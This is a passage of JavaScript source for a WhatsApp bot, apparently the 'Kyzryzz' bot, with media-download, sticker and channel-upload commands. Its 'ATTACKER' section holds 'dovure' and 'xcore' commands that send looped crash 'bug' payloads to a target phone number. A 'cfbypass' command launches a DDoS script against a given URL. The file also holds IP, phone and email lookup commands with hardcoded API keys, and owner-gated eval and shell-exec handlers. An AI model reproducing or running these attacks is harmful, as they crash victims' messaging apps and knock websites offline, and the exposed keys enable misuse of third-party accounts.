let ads = baten.setBody(`${isTele ? '(Tidak ada tanggal kadaluwarsa)' : '(Tidak diketahui)'}\n ${media.length} Byte(s)`)
m.reply(ads + `\nLink: ${link}`)
}
break
        
case'ngl':{
let [user, msg] = text.split`|`
if (!(user && msg)) return reply(`Ex: ${prefix + command} username/ngl_link | message`)
let link = /^(http|https):\/\/ngl.link/gi.test(user) ? user : /ngl.link/gi.test(user) ? `https://${user}` : `https://ngl.link/${user}`
let data = await cekUser(link)
if (!data) throw 'User not found/Invalid url'
await sendNgl(link, msg).then(() => m.reply(`Success send ngl to *"${user}"*\nMessage: *"${msg}"*`))
}
break

case 'play':
case 'lagu':{
  if (!text) return reply(`Enter YouTube search keywords, *Example :* ${prefix + command} tentang rasa`);
  const yts = require("yt-search") 
  m.reply(mess.wait) 
  let response = await yts(text); 
  let data = response.videos; 
   let vidyt = data[0]
  if (!data.length) return reply('Tidak ada hasil yang ditemukan.');
  let resultMessage = data.map(video => 
      `🎵 *Judul:* ${video.title}\n` +
      `🎤 *Author:* ${video.author.name}\n` +
      `⏱️ *Durasi:* ${video.timestamp}\n` +
      `👁️ *Views:* ${video.views}\n` +
      `⏳ *Uploaded:* ${video.ago}\n` +
      `🔗 *URL:* ${video.url}\n` +
      `🖼️ *Thumbnail:* ${video.thumbnail}\n`
    ).join('\n\n');
Kyzz.sendMessage(m.chat, {
  text: `${resultMessage}`,
      contextInfo: {
      externalAdReply: {
        title: vidyt.title,
        body: '',
        thumbnailUrl: vidyt.thumbnil,
        sourceUrl: vidyt.url,
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  }, {quoted:m})
}
break

case'play2':
case'play':
case'p2': {
const yts = require('yt-search') 

        if (!text) return m.reply(`what song do you want to play *Example*: .play river flows`);
        m.reply(mess.wait) 
        let search = await yts(text);
        let vid = search.videos[0];
        let { title, thumbnail, timestamp, views, ago, url } = vid;
        let videoUrl = search.all[0].url;
         const response = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3?url=${videoUrl}`);
        const audioUrl = response.data.data.mp3;

            await Kyzz.sendMessage(m.chat, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: false
            }, { quoted: m });
let kyZ = {
            audio: {
                url: audioUrl,
            },
            mimetype: "audio/mpeg",
            fileName: title + ".mp3",
            contextInfo: {
                forwardingScore: 100,
                isForwarded: true,
            },
        };
        await Kyzz.sendMessage(m.chat, kyZ, { quoted: m });
}
break
        
case'yta':
case'ytmp3': {
  if (!text) throw `Ex: ${prefix + command} <link YouTube>`;
Kyzz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key, }})

    let response = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3?url=${text}`);
  let res = response.data.data
  let audio = res.dl
    const doc = {
      audio: { url: audio },
      mimetype: 'audio/mp4',
      fileName: `${res.title}.mp3`,
      contextInfo: {
      }
    };
    await Kyzz.sendMessage(m.chat, doc, { quoted: m });
   
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case'ytv':
case'ytmp4': {
  if (!text) throw `Ex: ${prefix + command} <link YouTube>`;
  Kyzz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key, }})

      let response = await axios.get(`https://api.vreden.my.id/api/ytplaymp4?query=${args[1]}`);
  let res = response.data.result.metadata
  let video = response.data.result.download.url
  Kyzz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key, }})
            Kyzz.sendMessage(m.chat, {
                video: {
                    url: video
                }, 
                caption: `${res.title}`
            }, {
                quoted: m
            })
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})

};
break
       
/* # UPCH # */
case 'ch': {
  if (!text) return reply(`Enter search keywords, *Example:* ${prefix + command} trending`);
  
  const yts = require("yt-search");
  m.reply(mess.wait);
  
  try {
    let response = await yts(text);
    let data = response.videos;

    if (!data.length) return reply('Tidak ada hasil yang ditemukan.');

    let isiMenu = [];
    let isiData = [];

    data.forEach((video) => {
      isiMenu.push({
        title: `Audio: ${video.title}`,
        description: `Upload Audio dengan Durasi: ${video.timestamp}`,
        rowId: `ch2 ${video.url}`,
      });

      isiData.push({
        title: `Video: ${video.title}`,
        description: `Upload Video dengan Durasi: ${video.timestamp}`,
        rowId: `toch mp4 ${video.url}`,
      });
    });

    const datas = [
      {
        title: '[🔊] UPCH - AUDIO',
        rows: isiMenu,
      },
      {
        title: '[🎥] UPCH - VIDEO',
        rows: isiData,
      },
    ];

    let imgdana = await prepareWAMessageMedia(
      { image: { url: data[0].thumbnail } },
      { upload: Kyzz.waUploadToServer }
    );

    const msgii = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
            },
            interactiveMessage: {
              header: {
                text: "YTDL - UPCH",
                imageMessage: imgdana,
              },
              footer: "Pilih salah satu untuk mengunduh:",
              sections: datas,
              buttonText: "Pilih Opsi",
            },
          },
        },
      },
      { userJid: m.sender, quoted: fkontak }
    );

    await Kyzz.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
  } catch (err) {
    console.error(err);
    reply('Terjadi kesalahan saat memproses permintaan Anda.');
  }
}
break

case'ch2': {
const yts = require('yt-search') 

        const text = args.join(" ");
        if (!text) return m.reply(`what song do you want to upload *Example*: .play river flows`);
        m.reply(mess.wait)
        let search = await yts(text) 
        let vid = search.videos[0];
        let { title, thumbnail, timestamp, views, ago, url } = vid;
        let videoUrl = search.all[0].url;
        let anu = url || text
         const response = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3?url=${anu}`);
        const audioUrl = response.data.data.mp3;

Kyzz.sendMessage(`${global.idch}`, {audio: { url: audioUrl }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
forwardingScore: 999,
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285921655444@s.whatsapp.net" 
},
forwardedNewsletterMessageInfo: {
newsletterName: '[🎶] ' + title,
newsletterJid: `${idch}`
}}},{quoted: m});
    reaction(m.chat, "✅") 
    m.reply(mess.donech) 
}
break

case"toch": {
Kyzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }}) 
Kyzz.sendMessage(m.chat, { react: { text: '⌛', key: m.key }}) 

    if (args[0] === 'mp3') {
    let respon = await axios.get(`https://api.vreden.my.id/api/ytplaymp3?query=${args[1]}`);
  let res = respon.data.result.metadata
  let audio = respon.data.result.download.url

    Kyzz.sendMessage(`${global.idch}`, {audio: { url: audio }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
forwardingScore: 999,
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285921655444@s.whatsapp.net" 
},
forwardedNewsletterMessageInfo: {
newsletterName: '[🎶] ' + res.title,
newsletterJid: `${idch}`
}}},{quoted: m});

Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})        
}
if (args[0] === 'mp4') {
    let result = await axios.get(`https://api.vreden.my.id/api/ytplaymp4?query=${args[1]}`);
  let res = result.data.metadata
  let video = result.data.download.url
  Kyzz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key, }})
            Kyzz.sendMessage(`${idch}`, {
                video: {
                    url: video
                }, 
                caption: `${res.title}`
            }, {
                quoted: m
            })
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
    reply(mess.donech) 
}
break

case'ttch':
case'tch':{
if (!text) return reply(`used to download tiktok videos, how to use it, *Example:* ${prefix + command} <url tiktok>`)
let shit = await tiktok(text)
Kyzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let { data } = shit
const button = new Button()
  button.setTitle(`*[ TTDL CH ]*`);
  button.setImage(data.cover); 
  button.setBody(`Query url: ${text}
  
[ DATA VIDEO ]
Result: ${data.play}
Title: ${data.title}
Duration: ${data.duration}s
  
[ DATA MUSIC ]
Result: ${data.music}
Title: ${data.music_info.title}
Original: ${data.music_info.original}
Duration: ${data.duration}s
`);
  button.addSelection("Select For Up2ch");
  button.makeSections(`Query: ${text}`, "");
    button.makeSections(`${data.title}`);
    button.makeRow(
      `Upload Audio 🔊`,
      `Up2ch Audio: ${data.music_info.title}`,
      `Upload TikTok Audio🔊`,
      `.t2ch aud ${text}`,
    );
    button.makeRow(
      `Upload Video 🎥`, 
      `Up2ch Video: ${data.title}`, 
      `Upload TikTok Video 🎥`, 
      `.t2ch vid ${text}`, 
    );
    await button.run(m.chat, Kyzz, fkontak)
}
break
case't2ch':{
let shit = await tiktok(args[1])
let { data } = shit
if (args[0] === 'aud') {
Kyzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
Kyzz.sendMessage(`${global.idch}`, {audio: { url: data.music }, mimetype: "audio/mp4", ptt: true, contextInfo: {
forwardingScore: 999,
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285921655444@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: '[🎶] ' + data.music_info.title,
newsletterJid: `${idch}`
}}},{quoted: m});
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
if (args[0] === 'vid') {
    let baten = new Button();
Kyzz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }})
Kyzz.sendMessage(idch, { video: { url: data.play }, caption: data.title })
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
    reply(mess.donech) 
}
break

case "kyz": {
    Kyzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key }});
    await sleep(2000);
    Kyzz.sendMessage(m.chat, { react: { text: '⌛', key: m.key }});
   
        let audBuff = await quoted.download(); 
  
        Kyzz.sendMessage(idch, {
            audio: audBuff,
            mimetype: "audio/mpeg",
            fileName: "kyzUnivrs.mp3",
            ptt: true, 
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363316387241559@newsletter",
                    serverMessageId: null,
                    newsletterName: "Kyzryzz Universe!!",
                },
                externalAdReply: {
                    showAdAttribution: true,
title: "[🎶] " + text,
body: null, 
sourceUrl: "https://Powered By " + footer,
thumbnailUrl: thumb
                },
            }}, {quoted:m});
    
    await reply(mess.donech) 
    Kyzz.sendMessage(m.chat,{ react: { text: '✅', key: m.key }}) 
}
break
        
case "ach": {
    let [idnya, capt] = text.split('|') 
    if (!idnya,!capt) return reply(`input idch dan caption musik\nEx: ${prefix+command} 120363316387241559@newsletter|dj now`);
    Kyzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key }});
    await sleep(2000);
    Kyzz.sendMessage(m.chat, { react: { text: '⌛', key: m.key }});
   
        let audBuff = await quoted.download(); 
  
        Kyzz.sendMessage(idnya, {
            audio: audBuff,
            mimetype: "audio/mpeg",
            fileName: "kyzUnivrs.mp3",
            ptt: true, 
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: idnya,
                    serverMessageId: null,
                    newsletterName: "Powered By Kyzryzz!!",
                },
                externalAdReply: {
                    showAdAttribution: true,
title: "[🎶] " + capt,
body: null, 
sourceUrl: "https://Powered By " + footer,
thumbnailUrl: thumb
                },
            }}, {quoted:m});
        Kyzz.sendMessage(m.chat,{ react: { text: '✅', key: m.key }}) 
}
break


case"upch":{
if (args[0] === "audio") {
if (!isCreator) return reply(mess.owner)
Kyzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(2000)
Kyzz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
Kyzz.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mp4", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "17066043972@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `<!> Powered By KyzRyzz`,
newsletterJid: "120363247149539361@newsletter"}
}},{quoted: m})
await sleep(2000)
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
} if (args[0] === "video") {
Kyzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(2000)
Kyzz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
Kyzz.sendAnnotations(Kyzz, `${global.idch}`, await quoted.download() ,"")
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}}
break     
        
/* # STICKER # */
case 'sticker':
case 'stiker':
case 'cls':
case 's':{
if (!m.quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kyzz.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await Kyzz.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break

/* # INDEX # */   
case 'autoai':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`*Example :* ${prefix + command} on/off`)
if (q == 'on') {
global.db.data.chats[m.chat].ai = true
reply('Sukses mengaktifkan chat ai')
} else if (q == 'off') {
global.db.data.chats[m.chat].ai = false
reply('Sukses mengnonaktifkan chat ai')
} else {
reply(`Penggunaan Salah\n*Example :* ${prefix + command} on/off`)
}
break
        
case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply(`Berhasil Menghapus ${filteredArray.length} file sampah...`)
});
if (args[0] === "backup") {
await sleep(5000)
reply("Proses Backup")
await sleep(3000)
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r myscript.zip ${ls.join(" ")}`);
await Kyzz.sendMessage(m.chat, { document: await fs.readFileSync("./myscript.zip"), mimetype: "application/zip", fileName: "myscript.zip",},{quoted: m}); await execSync("rm -rf myscript.zip");
}
}
break
        
/* # CHECK - INFO # */
case"ci":{
if (!m.quoted) throw reply('reply chat saluran channel') 
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`${id.newsletterJid}`)
} catch (e) {
throw 'Harus chat dari channel bang'
}
}
break

case "lacakip":
case "lacakipaddres":
case "iplookup":{
if (!isCreator) return reply("Khusus Owner njir");
if (!q) return reply(`Enter the IP address you want to track, *Examle:* ${prefix + command} <ip_address>`);
try {
let res = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=534f9b4c1a294b29983ac441c009941a&ip=${q}`);
const data = res.data;
let txt = `🔍 *IP Lookup Result* 🔍

* IP Address: ${data.ip}
* Location: ${data.city}, ${data.state_prov}, ${data.country_name}
* Country: ${data.country_name} ${data.country_emoji} (${data.country_capital})
* Continent: ${data.continent_name}
* ISP: ${data.isp}
* Organization: ${data.organization}
* Latitude: ${data.latitude}
* Longitude: ${data.longitude}
* Languages: ${data.languages}
* Currency: ${data.currency.name} (${data.currency.symbol});

* Time Zone: ${data.time_zone.name}
* Current Time: ${data.time_zone.current_time}
* Offset: ${data.time_zone.offset} hours
* DST: ${data.time_zone.is_dst ? "Yes" : "No"}
* DST Start: ${data.time_zone.dst_start?.utc_time} (${data.time_zone.dst_start?.duration})
* DST End: ${data.time_zone.dst_end?.utc_time} (${data.time_zone.dst_end?.duration})
* Time Zone Offset with DST: ${data.time_zone.offset_with_dst} hours
* Country Flag: ${data.country_flag}`
const baten = new Button()
let ads = baten.setBody(txt);
ads += baten.addUrl(footer, `kyzuuryz.xyz`);
ads += baten.run(m.chat, Kyzz, fkontak);
} catch (error) {
console.log(error);
return reply("An error occurred while fetching the IP data.");
}}
break;
        
case "phonelookup":{
if (!q) return reply(`Enter the target number you want to ${command}, *Example:* ${prefix + command}`);
try {
let res = await axios.get("http://apilayer.net/api/validate", {
params: {
access_key: "d1961af3cb3d2b5bbef68dfaedbd133a", 
number: q, 
}});

let data = res.data;
if (!data.valid) { 
return reply(`Nomor tidak valid: ${q}`)
}
    
let txt = `🔍 Hasil Pengecekan Nomor Telepon 🔍

* Nomor: ${data.number}
* Valid: ${data.valid ? "Iya" : "Tidak"}
* Nomor Internasional: ${data.international_format}
* Nomor Lokal: ${data.local_format}
* Negara: ${data.country_name}
* Kode Negara: ${data.country_code}
* Operator: ${data.carrier}
* Garis Jenis: ${data.line_type}`;
const baten = new Button()
let ads = baten.setBody(txt.trim());
ads += baten.addUrl(footer, `kyzuuryz.xyz`);
ads += baten.run(m.chat, Kyzz, fkontak);
} catch (error) {
console.error(error);
return reply("Terjadi kesalahan saat memeriksa nomor telepon.");
}
}
break;
        
case "emaillookup":{
if (!q) return reply(`Enter the Email Address you want to ${command}, *Example:* ${prefix + command}`);
try {
let res = await axios.get("https://api.zerobounce.net/v2/validate", {
params: {
api_key: "q5ExXzPrWWMIWgl6EHTKLzU2JBjKdBVI",
email: q,
}});

let data = res.data;
if (data.status === "invalid" || data.status === "unknown") {
return reply(`Email tidak valid atau tidak dapat ditemukan: ${q}`);
}

let txt = `🔍 Hasil Pengecekan Email 🔍
* Email: ${data.email}
* Status: ${data.status}
* Sub Status: ${data.sub_status}
* Account: ${data.account}
* Domain: ${data.domain}
* Free Email: ${data.free_email ? "Iya" : "Tidak"}
* Role Email: ${data.role ? "Iya" : "Tidak"}
* Disposable: ${data.disposable ? "Iya" : "Tidak"}
* Toxic: ${data.toxic ? "Iya" : "Tidak"}
* Deliverable: ${data.status === "valid" ? "Iya" : "Tidak"}`;
const baten = new Button()
let ads = baten.setBody(txt.trim());
ads += baten.addUrl(footer, `kyzuuryz.xyz`);
ads += baten.run(m.chat, Kyzz, fkontak);
} catch (error) {
console.error(error);
return reply("Terjadi kesalahan saat memeriksa email.");
}
}
break;

case"listgc":
case"mygc": {
let groups = Object.values(await Kyzz.groupFetchAllParticipating()),

		txt = `*┉┄┈┈┈ 『  GROUP LIST  』 ┉┄┈┈┈*\n\n*Total Grup:* ${groups.length} _group joined_\n\n`

	for (let i = 1; i < groups.length; i++) {

		txt += `${i} ` + `${groups[i].subject}\n`

	}

 m.reply(txt.trim())
}
break
        
/*  # ATTACKER # */        
case 'dovure': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> Example : ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.wait)
for (let j = 0; j < 10; j++) {
await location(Kyzz, target, dust, true)
await IosShot(Kyzz, target)
await sendPaymentInfoMessage(Kyzz, target)
await coresix(Kyzz, target, dust)
}
await sleep(5000)
await reply(`*[  !  ]  Successfully Send Bug* To ${target} using ${command}, use it slowly so the bot doesn't get banned :)`)
}
break
        
case 'xcore': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> Example : ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.wait)
for (let j = 0; j < 10; j++) {
await zodyck(Kyzz, target, "zodyck", 1020000, true)
await IosShot(Kyzz, target)
await zodyck(Kyzz, target, "zodyck", 1020000, true)
}
await sleep(5000)
await reply(`*[  !  ]  Successfully Send Bug* To ${target} using ${command}, use it slowly so the bot doesn't get banned :)`)
}
break

/*  # ! My DDoS  */
case "cfbypass":{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`this is how to use it ${prefix + command} <url> <time>`)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 10
reply(`*[  !  ]  successful ddos web with the following format* :
> method: ${command} 
> Target: ${url} 
> Duration: ${time}

Don't use it too much, because it will have fatal consequences for you (user panel)`)
exec(`node ./lib/ddos/CFBypass.js ${url} ${time}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
        
/* # consoleInfo # */
//Powered By Kyzryzz * kyzryzz.t.me
// * Code By Nazand Code
// * Fitur Mengirim Semua Isi Dalam Console Server Panel (Dibuat Krn Gabut)
// * Hapus Wm Denda 500k Rupiah
// * https://whatsapp.com/channel/0029Vaio4dYC1FuGr5kxfy2l

case"console":
case"csl": {
let consoleLogs = "";
function captureConsoleLogs() {
  const originalConsoleLog = console.log;
  const originalConsoleError = console.error;
  console.log = function(...args) {
    const message = args.join(' ');
    consoleLogs += `[LOG] ${message}\n`;
    originalConsoleLog.apply(console, args);
  };

  console.error = function(...args) {
    const message = args.join(' ');
    consoleLogs += `[ERROR] ${message}\n`;
    originalConsoleError.apply(console, args);
  };
}
async function sendConsoleLogs(Kyzz, chatId) {
  if (!consoleLogs) {
    return Kyzz.sendMessage(chatId, { text: 'Tidak ada log yang tersedia.' });
  }
  await Kyzz.sendMessage(chatId, { text: consoleLogs });

  // Jika ingin mengirim log dalam bentuk file teks
  // const tempFilePath = '/tmp/console_logs.txt';
  // fs.writeFileSync(tempFilePath, consoleLogs);
  // await Kyzz.sendMessage(chatId, { document: { url: tempFilePath }, mimetype: 'text/plain', fileName: 'console_logs.txt' });
  
  consoleLogs = '';
}
  try {
    await sendConsoleLogs(Kyzz, m.chat);
  } catch (error) {
    console.error('terjadi Kesalahan Bang:', error);
    await Kyzz.sendMessage(m.chat, { text: `⚠️ Error: ${error.message}` }, { quoted: m });
  }
captureConsoleLogs();
}
break
        
/* # ENDCODE # */
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return kizzr(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}
        
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await kizzr(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
if (budy.startsWith('$')) {
    if (!Access) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return kizzr(`${err}`)
        if (stdout) return kizzr(stdout)
    })
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
